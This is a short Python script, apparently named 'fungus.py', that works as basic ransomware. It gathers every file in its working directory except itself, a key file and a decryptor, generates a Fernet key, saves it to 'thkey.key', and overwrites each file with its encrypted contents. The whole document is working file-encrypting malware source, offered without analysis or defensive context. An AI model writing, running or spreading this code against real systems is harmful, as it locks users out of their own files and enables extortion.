import os 
from cryptography.fernet import Fernet
files =  []
i = 1
for file in os.listdir():
    if file == "fungus.py" or file == "thkey.key" or file == "decrypt.py" :
        continue
    if os.path.isfile(file):
        files.append(file)
print(file)

key = Fernet.generate_key()

with open("thkey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
       done =  thefile.write(contents_encrypted)
       if done:
        print("over")

    